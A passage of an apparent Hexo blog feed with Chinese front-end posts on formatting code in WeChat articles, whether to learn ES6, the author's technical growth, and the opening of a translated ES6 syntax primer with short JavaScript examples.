        <content type="html"><![CDATA[<blockquote><p>下文不用看了，直接戳这里吧：<a href="http://md.barretlee.com/" target="_blank">http://md.barretlee.com/</a>，我开发了一个在线工具。</p></blockquote><p>这几天有不少朋友在我的微信公众号留言，问我是如何在公众号页面中整齐摆放代码的，今天就分享下我的方法，事实上我也折腾了好一会儿。</p><p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5spwap82oj20p00dwacl.jpg" alt="//unsplash.com/photos/KR84RpMCb0w by Khara Woods"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5spwap82oj20p00dwacl.jpg">--></p><span id="more"></span><h3 id="长话短说"><a href="#长话短说" class="headerlink" title="长话短说"></a>长话短说</h3><blockquote><p>Markdown 解释器在转换代码片段时，没有在换行的时候添加 <code>&lt;br&gt;</code> 标签，而是直接输出一个换行符 <code>\n</code>，微信编辑页在保存或者预览时，将部分换行符给过滤了。</p></blockquote><p>下文主要讲的是很多公众号维护者遇到的代码展示问题，以及处理这些问题的几个思路。</p><h3 id="自动批量将代码转为图片"><a href="#自动批量将代码转为图片" class="headerlink" title="自动批量将代码转为图片"></a>自动批量将代码转为图片</h3><p>观察了很多技术类公众号，绝大多数为了保证良好可视效果，直接采用代码截图，这种做法很简洁，但也存在几个问题：</p><ul><li>需要人肉截图和上传图片，对公众号维护者来说很麻烦</li><li>页面中代码截图太多，也影响阅读，尤其是弱网下的读者</li><li>截图控制不好，会出现多余内边距，或者因为尺寸问题，不得已做缩放处理</li></ul><p>以上对维护者和用户来说，都是很不爽的，如果一定要使用图片，我倒是建议维护者开发一个组件，将页面中的代码段自动转为图片，思路如下：</p><ul><li>将代码片段渲染出来，使用 <code>highlight.js</code> 高亮代码</li><li>将高亮的代码绘制到 canvas 中</li><li>导出 base64 图片，或者通过 <code>a[download]</code> 将图片下载下来保存到本地</li></ul><p>之前月影姐姐开发了一个 <code>code-to-image</code>，感兴趣的同学可以去 github 上搜索下。</p><p>我有考虑过写这个程序，不过后来找到了一个更加有用的办法。</p><h3 id="Markdown-Here"><a href="#Markdown-Here" class="headerlink" title="Markdown Here"></a>Markdown Here</h3><p><code>Markdown Here</code> 是一款 Chrome 插件，顾名思义，就是将你写的 Markdown 直接转为 HTML 代码，我做了一个演示图片：</p><p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5sr5vq6sng20f70c844o.gif" alt="markdown here"><!--<source src="https://ww1.sinaimg.cn/mw690/6c0378f8gw1f5sr5vq6sng20f70c844o.gif">--></p><p>图中的编辑框并不是一个 <code>textarea</code> 控件，试想下这个控件中怎么玩也玩不出渲染好的 HTML 代码来，事实上，它是一个可编辑的普通元素，即加了一个 <code>contenteditable</code> 属性，你可以按照下面的步骤测试下：</p><ul><li>打开一个新的 Tab</li><li>URL 中输入：<code>data:text/html,&lt;html contenteditable&gt;</code></li><li>然后去一个网页中全选所有内容，在上面的 URL 页面中粘贴</li></ul><p>是不是把粘贴的内容是具备样式的？再用 Chrome Devtools 看看每个元素，你会发现，原来的样式被继承下来并且作为内敛样式嵌入。</p><p>微信公众号的编辑框也是 contenteditable 的，所以你可以通过 Markdown Here 插件将 Markdown 文本直接转换为代码。只可惜，可是在点击保存和预览的时候，内容又被微信的脚本重新解析了一次，过滤了部分内敛属性，一些转行符也被它给忽略了，如下在微信编辑框中展示正常的代码：</p><p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5spemu4oxj20x608ijs2.jpg" alt="正常代码"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5spemu4oxj20x608ijs2.jpg">--></p><p>在点击预览后，展示效果为：</p><p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5spfr9y53j20kc0gowfi.jpg" alt="错乱代码"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5spfr9y53j20kc0gowfi.jpg">--></p><p>变成一行了，原因是代码中部分转行符号被过滤掉了。</p><h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>可以通过几行正则，将 Markdown 转换的源码做小小的修改，部分换行符 <code>\n</code> 替换成 <code>&lt;br&gt;</code> 标签就行了。我的个人博客采用的是 hexo 构建的，它渲染出来的代码在换行处已经有了换行标签：</p><p><img src="/../blogimgs/2016/07/14/6c0378f8gw1f5sprhj1v5j214c0ziafp.jpg" alt="棒棒的代码效果"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5sprhj1v5j214c0ziafp.jpg">--></p><p>把博客代码直接粘贴过来的效果是：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">syntaxHighlighting</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">33</span>;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="string">&quot;hello, こんにちは&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是不是感觉还不错？那么，写正则替换微信编辑器渲染源码，修复过滤换行符问题这么神圣的事情，就交给读者了！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信公众号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我需要学习 ECMAScript 6 么？</title>
      <link href="/blog/2016/07/13/why-i-learning-es6/"/>
      <url>/blog/2016/07/13/why-i-learning-es6/</url>
      
        <content type="html"><![CDATA[<p>前几天翻译了一篇 <a href="https://www.barretlee.com/blog/2016/07/09/a-kickstarter-guide-to-writing-es6/">ECMAScript 6 的入门文章</a>，看到几则评论说 JavaScript 越来越像 Java 了，我暗暗地笑了笑。也有同学很疑惑是否有必要学习 ES6，使用 TypeScript 的同学也有类似的疑惑。</p><span id="more"></span><p><img src="/../blogimgs/2016/07/13/6c0378f8gw1f5rkudyzzoj20p00dwt9x.jpg" alt="//unsplash.com/@dtopkin1 by Dayne Topkin"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5rkudyzzoj20p00dwt9x.jpg">--></p><p>记得之前 <a href="http://weibo.com/u/1196343093">winter</a> 在微博上说，不要对知识存在偏见性，人家吵架说什么什么东西不要学，千万千万别信，但是他们吵架时提到的知识点，记得赶紧收进口袋装好。那么，ES6 这个话题呢？你是否对这个话题存在偏见性？</p><h3 id="ES6-历史简述"><a href="#ES6-历史简述" class="headerlink" title="ES6 历史简述"></a>ES6 历史简述</h3><p>ECMAScript 6，很多地方称之为 ECMAScript 2015，从老外们的博客来看，貌似更倾向于后面的叫法，这个并不重要。</p><p>ECMAScript 是一个标准，从 1.0 发展至今，目前已经进入 <a href="//tc39.github.io/ecma262/">ES7 草案阶段</a>，其中有两个版本是我们熟知的，ECMAScript 3.1 和 ECMAScript 5.0，旧版的 IE 实现都是基于 3.1 规范，而 IE9 以后及现代浏览器基本都依照 ES5.0 规范。</p><p>标准的每个版本都会经历多个阶段：提案、草案、标准、实验性、文档和历史标准。其中 Draft&#x2F;REC&#x2F;RFC 三种状态是阅读规范是最常看到的，到了 RFC 的文档基本就不会再变化了，后续的变化会提到下一个版本的提案或草案中。</p><h3 id="ES6-讲述了什么？"><a href="#ES6-讲述了什么？" class="headerlink" title="ES6 讲述了什么？"></a>ES6 讲述了什么？</h3><p>阅读 ES6 文档，最直观的感受是，它更加灵活了。矫正了 ES5.0 很多模棱两可的写法（事实上 ES5.0 的 strict 模式就已经很严格了）；同时在基础对象上扩展了很多工具函数，这一扩充基本让我们告别了 prototype&#x2F;undescore 等类库，并且它还加强了对 UTF-16 的支持；同时增加了大型工程下编程的语法支持，如 Class&#x2F;Module&#x2F;Import&#x2F;Decorator 等语法。</p><p>ES6 不希望语言本身对编程有限制，也不希望模糊不清的写法迷惑编程人员。而在添加很多语法糖之后，CoffeeScript 和 TypeScript 就略显多余了，两种预处理语言刚出来的时候，我也花了很多功夫去学习，并且尝试去适应。而现在，ES6 作为一种标准出现在我们眼前，我已经不能说服自己再使用其他预处理语言编写 JS 代码了。</p><h3 id="我需要学习-ES6-么？"><a href="#我需要学习-ES6-么？" class="headerlink" title="我需要学习 ES6 么？"></a>我需要学习 ES6 么？</h3><p>这个问题，还是让代码来回答吧：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Baz</span> <span class="keyword">from</span> <span class="string">&#x27;bazGroup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Baz</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">classMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">args</span> = args;</span><br><span class="line">  &#125;</span><br><span class="line">  * [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> arg <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">args</span>) &#123;</span><br><span class="line">      <span class="keyword">yield</span> arg;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Foo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">classMethod</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">classMethod</span>() + <span class="string">&#x27;, too&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Bar</span>.<span class="title function_">classMethod</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> x <span class="keyword">of</span> <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>)) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这串代码，你还能够完整理解么？</p><p>ECMAScript 2015 是一种标准，而且各个浏览器厂商都相当踊跃地遵循这个标准，目前 Chrome 已经支持了将近 80%+ 的 ES6 特性，业界流行框架类库都开始使用 ES6 编写，很多大小公司也开始玩弄起这个标准。不说别的原因，这类代码放到你眼前，你是否读得懂？</p><p>所以，ES6 需要学习么？毫无疑问呀😜</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> ECMAScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈我这三年在技术上的成长</title>
      <link href="/blog/2016/07/11/learning-recent-years/"/>
      <url>/blog/2016/07/11/learning-recent-years/</url>
      
        <content type="html"><![CDATA[<p>前些时候把微信 id 开放了出去，有很多朋友加我微信，其中大部分都是前端学习者。一些同学在学习的时候遇到了困难，或者说瓶颈吧，询问我处理办法，有的希望我讲述下学习经验。考虑到有些话题偏大，我没有详细回复，事实上我也不知道从何说起，今天思量了一番，记录下来。</p><p><img src="/../blogimgs/2016/07/11/6c0378f8gw1f5pdm84ep5j20go0p0n0b.jpg" alt="//unsplash.com/photos/7oL1PR6AV8o by Amanda Perez"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5pdm84ep5j20go0p0n0b.jpg">--></p><span id="more"></span><p>前些天写了一篇文章 <a href="https://www.barretlee.com/blog/2016/06/13/talk-about-front-end/">《谈一谈越来越难做的前端》</a>，谈了一下前端职能的变化，前端圈子越变越大，能做的事情也越来越多，于是可以选择的方向也多了起来。新名词、新技术接二连三跳串出来完全不给人喘息的机会，上一波没有学明白下一波甚至第三波就来了，很多人开始迷失在技术名词之中。而且每天对着同样的人做着同样的活儿，看不到自己的成长，也不知道如何成长。</p><p>我在 14 年 7 月 14 号正式入职淘宝，之前分别在百度和淘宝实习了三个月，两次实习让我成长了很多，而正式入职后在淘宝的两年更让我受益匪浅。一个人成长最快的时候，是他适应新环境的那段时间。</p><h3 id="扎实的基础"><a href="#扎实的基础" class="headerlink" title="扎实的基础"></a>扎实的基础</h3><p>记得第一次面试之前，我很努力地把所知道的前端相关的技术点列了列，写了好几页纸的关键词，然后针对每个关键词系统地巩固学习，解决心中的疑问以及学习时遇到的新疑问，然后自信满满地参加了新浪和网易的面试。那时候，估计两家公司的前端工程化已经有些苗头了，但可能认为学校里的同学没啥实战经验，主要问的都是前端基础题，闭包、正则、DOM 模型、Event 模型等等，没什么特别深入的话题。当然，那时候我的简历中也没有太多体现工程化相关的内容，估计跟面试官也聊不起来。</p><p>对于入门不久的前端同学，面试官着重考虑的是他们的学习能力、发展潜力，也会适当看看编程能力过不过关，对 JavaScript&#x2F;CSS&#x2F;HTML 的基础知识掌握的牢不牢固。如果你被面试官选中了，那就说明，你具有较强的综合素养，是一个合格的前端入门者。一般重点高校学生的学习能力都还不错，大学几门计算机相关学科的薰陶加上适当的课外练习后，编程能力也是能够接受的，所以公司喜欢招聘重点高校尤其是偏理工科的学生。我看到不少同学，在毕业前三五个月才开始了解和学习前端，单最后都顺利地进入 BAT。</p><p>我就属于上面这波人，只不过，不是毕业前抱佛脚，而是较早地接触了前端，看了很多书籍，融入了前端社区，并且在学校的技术团队中锻炼了基本功。我很庆幸自己会在大学时，投入那么多时间在前端基础知识的学习上，因为毕业后我发现，自己已经没有那么多时间和耐心来学习这些略感枯燥的知识了。已经工作的你还能够坚持一口气啃完犀牛书么？估计绝大多数人都没这个耐心吧，即便有些知识你已经淡忘了，只愿意把犀牛书作为工具书。我在毕业前就把这本书啃了四五遍，现在基本不需要这本工具书了。</p><p>大学期间读过的书很多，豆瓣上记录过 <a href="//book.douban.com/people/hustskyking/collect">大学读的书</a>，从每本书都吸收点知识，所以总的知识储备其实是足够应付面试和一般需求的。不谦虚地说，我对前端硬知识的了解比较全面，这对我后续的提升奠定了坚实的基础。</p><h3 id="知识体系和能力阶梯"><a href="#知识体系和能力阶梯" class="headerlink" title="知识体系和能力阶梯"></a>知识体系和能力阶梯</h3><p>但是，毕业工作后，才发现，我学的那点东西远远不够。事实上，毕业之前的实习就深有体会了。</p><p>为什么公司期望学生能够去实习？公司有自己的一套流程和技术体系，这一套东西是适配公司业务，方便各个工种之间协同作战的，而且每个公司的那一套都不太一样。刚毕业的同学最熟练的是对 API 的使用，而进入一个新环境后，会发现之前熟悉的那一套并不好使，有很多软件环境需要搭建，很多框架类库需要熟悉，还有一堆开发流程、上线流程、业务流程等等，这些东西会让一个自信的新人变得没有任何优越感。再加上分配的业务上还有几个小 bug 要修理，你几乎不会有自己的时间，学习变得变成了一种奢侈的事情。这也是给还在学校的同学一个警示，如果你要走技术这条路，基本功一定要打扎实，否则工作第一年你会相当吃力。</p><p>百度实习那几个月对我的改变很大，象牙塔外拼搏三个月，个人阅历见长且不说，技术上的认识有了很大幅度的提升。当然，这要感谢公司。在公司里很容易知道哪些技术是公司需要的，哪些技能是业务中必须熟练掌握的。慢慢的，对技术就有了一定的甄别能力，曾经摆在心中的技术关键词是单线程、兼容性、冒泡捕获、事件代理等等，而现在变成了组件化、调试模式、自动化测试、前端集成环境等等，完全是两个知识维度上的分类。</p><p>公司有不同层级的人，他们做的事情也有些差异，从这些差异中也能够体会出，自己跟这群人相比亮点和缺点分别是什么，如果需要提升还需要做些什么。越大的公司，对人能力的分级越明显，对个人来讲，也越容易找准自己的位置。知道自己水平在什么位置，也知道下一个水平在什么位置之后，我们需要的就只有努力了。</p><h3 id="业务和新技术"><a href="#业务和新技术" class="headerlink" title="业务和新技术"></a>业务和新技术</h3><p>我从来不担心社区又出来几个什么新的技术名词，因为我已经给这些词安排了座位，就在脑海中。比如 grunt、gulp、webpack 等名词出来的时候，我没有忙着去深入学习，脑子里有一张大概的体系图，先把它们打包扔到脑子里命名为“工程化-打包类”，先存起来，等到需要的时候再去学习。实际上，我也是隔了三四个月才去学习和使用他们的。</p><p>但是存进大脑之前，我会先简单了解这些工具：它能做什么？哪些场景可以用？大概如何用？社区在哪里？组件库如何搜索？三者之间的差异是什么？然后看看基本的 API，这些工作花不了多少时间，但是对我后续深入了解它们提供了很大的帮助。我一直很认可这句话：「知道从哪里可以学到知识，就就学会了这个知识的一半」。</p><p>所以我不担心有新技术出来，我不忙着学它，因为即便是我学会了，我的团队中也不会去用它，甚至业务中根本就用不上。对新知识做分类并且了解全貌，至于细节部分嘛，先放放。不要动不动就搞什么源码分析，React 的 diff 算法，Vue 的 MVVM，这种事情费事费力，其实稍微想象下就知道是个啥了么，中间的细节实现和实现原理不是不重要，而是暂时不重要。可以等到你闲下来或者预知业务中有需要时，再下工夫深入也不迟。</p><p>大多数情况下，技术都是跟着需求的变化而变化的，需求从哪里来？当然是从你的团队和业务之中出来的。跟着业务走，你的方向不会错！</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以说没有人系统地学过前端，大学没这门课，公司也没这门课。前端这个词是 ajax 流行时出现，它朝气蓬勃，发展却异常迅猛。要在技术这条路上走的长久，首先要把基础打扎实，然后才能能力和闲工夫循序渐进。</p><p>好吧，希望这篇文章对你有所启发，下次我再分享我是怎么建立自己的知识体系的。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript 6 扫盲</title>
      <link href="/blog/2016/07/09/a-kickstarter-guide-to-writing-es6/"/>
      <url>/blog/2016/07/09/a-kickstarter-guide-to-writing-es6/</url>
      
        <content type="html"><![CDATA[<p>ECMAScript 6 目前基本成为业界标准，它的普及速度比 ES5 要快很多，主要原因是现代浏览器对 ES6 的支持相当迅速，尤其是 Chrome 和 Firefox 浏览器，已经支持 ES6 中绝大多数的特性。</p><p><img src="/../blogimgs/2016/07/09/6c0378f8gw1f5npzp64c0j20p00dw77u.jpg" alt="//unsplash.com/photos/iCtJF-A5hvs by Jeff Hopper"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f5npzp64c0j20p00dw77u.jpg">--></p><p>本文译自 Github 上的<a href="//github.com/metagrover/ES6-for-humans">一篇文章</a>，目的是对还不太熟悉 ES6 语法的同学做一个简单的扫盲。</p><span id="more"></span><h3 id="1-let、const-和-block-作用域"><a href="#1-let、const-和-block-作用域" class="headerlink" title="1. let、const 和 block 作用域"></a>1. let、const 和 block 作用域</h3><p><code>let</code> 允许创建块级作用域，ES6 推荐在函数中使用 <code>let</code> 定义变量，而非 <code>var</code>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">3</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>同样在块级作用域有效的另一个变量声明方式是 <code>const</code>，它可以声明一个常量。ES6 中，<code>const</code> 声明的常量类似于指针，它指向某个引用，也就是说这个「常量」并非一成不变的，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">ARR</span> = [<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line">  <span class="variable constant_">ARR</span>.<span class="title function_">push</span>(<span class="number">7</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">ARR</span>); <span class="comment">// [5,6,7]</span></span><br><span class="line">  <span class="variable constant_">ARR</span> = <span class="number">10</span>; <span class="comment">// TypeError</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有几个点需要注意：</p><ul><li><code>let</code> 关键词声明的变量不具备变量提升（hoisting）特性</li><li><code>let</code> 和 <code>const</code> 声明只在最靠近的一个块中（花括号内）有效</li><li>当使用常量 <code>const</code> 声明时，请使用大写变量，如：CAPITAL_CASING</li><li><code>const</code> 在声明时必须被赋值</li></ul><h3 id="2-箭头函数（Arrow-Functions）"><a href="#2-箭头函数（Arrow-Functions）" class="headerlink" title="2. 箭头函数（Arrow Functions）"></a>2. 箭头函数（Arrow Functions）</h3><p>ES6 中，箭头函数就是函数的一种简写形式，使用括号包裹参数，跟随一个 <code>=&gt;</code>，紧接着是函数体：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getPrice = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4.55</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation with Arrow Function</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">getPrice</span> = (<span class="params"></span>) =&gt; <span class="number">4.55</span>;</span><br></pre></td></tr></table></figure><p>需要注意的是，上面栗子中的 <code>getPrice</code> 箭头函数采用了简洁函数体，它不需要 <code>reture</code> 语句，下面这个栗子使用的是正常函数体：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> breakfast = arr.<span class="title function_">map</span>(<span class="function"><span class="params">fruit</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> fruit + <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(breakfast); <span class="comment">// apples bananas oranges</span></span><br></pre></td></tr></table></figure><p>当然，箭头函数不仅仅是让代码变得简洁，函数中 <code>this</code> 总是绑定总是指向对象自身。具体可以看看下面几个栗子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">growUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 在非严格模式下，growUp() 函数的 this 指向 window 对象</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure><p>我们经常需要使用一个变量来保存 <code>this</code>，然后在 growUp 函数中引用：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">  self.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> <span class="title function_">growUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    self.<span class="property">age</span>++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而使用箭头函数可以省却这个麻烦：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// |this| 指向 person 对象</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure><p>在 <a href="//developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions#Lexical_this">这里</a> 可以阅读更多 <code>this</code> 在箭头函数中的词法特性。</p><h3 id="3-函数参数默认值"><a href="#3-函数参数默认值" class="headerlink" title="3. 函数参数默认值"></a>3. 函数参数默认值</h3><p>ES6 中允许你对函数参数设置默认值：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">getFinalPrice</span> = (<span class="params">price, tax=<span class="number">0.7</span></span>) =&gt; price + price * tax;</span><br><span class="line"><span class="title function_">getFinalPrice</span>(<span class="number">500</span>); <span class="comment">// 850</span></span><br></pre></td></tr></table></figure><h3 id="4-Spread-x2F-Rest-操作符"><a href="#4-Spread-x2F-Rest-操作符" class="headerlink" title="4. Spread &#x2F; Rest 操作符"></a>4. Spread &#x2F; Rest 操作符</h3><p>Spread &#x2F; Rest 操作符指的是 <code>...</code>，具体是 Spread 还是 Rest 需要看上下文语境。</p><p>当被用于迭代器中时，它是一个 Spread 操作符：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x,y,z</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x,y,z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="title function_">foo</span>(...arr); <span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure><p>当被用于函数传参时，是一个 Rest 操作符：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>( <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>); <span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h3 id="5-对象词法扩展"><a href="#5-对象词法扩展" class="headerlink" title="5. 对象词法扩展"></a>5. 对象词法扩展</h3><p>ES6 允许声明在对象字面量时使用简写语法，来初始化属性变量和函数的定义方法，并且允许在对象属性中进行计算操作：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getCar</span>(<span class="params">make, model, value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 简写变量</span></span><br><span class="line">    make,  <span class="comment">// 等同于 make: make</span></span><br><span class="line">    model, <span class="comment">// 等同于 model: model</span></span><br><span class="line">    value, <span class="comment">// 等同于 value: value</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 属性可以使用表达式计算值</span></span><br><span class="line">    [<span class="string">&#x27;make&#x27;</span> + make]: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 忽略 `function` 关键词简写对象函数</span></span><br><span class="line">    <span class="title function_">depreciate</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">value</span> -= <span class="number">2500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> car = <span class="title function_">getCar</span>(<span class="string">&#x27;Barret&#x27;</span>, <span class="string">&#x27;Lee&#x27;</span>, <span class="number">40000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: &#123;</span></span><br><span class="line"><span class="comment">//     make: &#x27;Barret&#x27;,</span></span><br><span class="line"><span class="comment">//     model:&#x27;Lee&#x27;,</span></span><br><span class="line"><span class="comment">//     value: 40000,</span></span><br><span class="line"><span class="comment">//     makeBarret: true,</span></span><br><span class="line"><span class="comment">//     depreciate: function()</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><h3 id="6-二进制和八进制字面量"><a href="#6-二进制和八进制字面量" class="headerlink" title="6. 二进制和八进制字面量"></a>6. 二进制和八进制字面量</h3><p>ES6 支持二进制和八进制的字面量，通过在数字前面添加 <code>0o</code> 或者 <code>0O</code> 即可将其转换为二进制值：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> oValue = <span class="number">0o10</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(oValue); <span class="comment">// 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bValue = <span class="number">0b10</span>; <span class="comment">// 二进制使用 `0b` 或者 `0B`</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bValue); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="7-对象和数组解构"><a href="#7-对象和数组解构" class="headerlink" title="7. 对象和数组解构"></a>7. 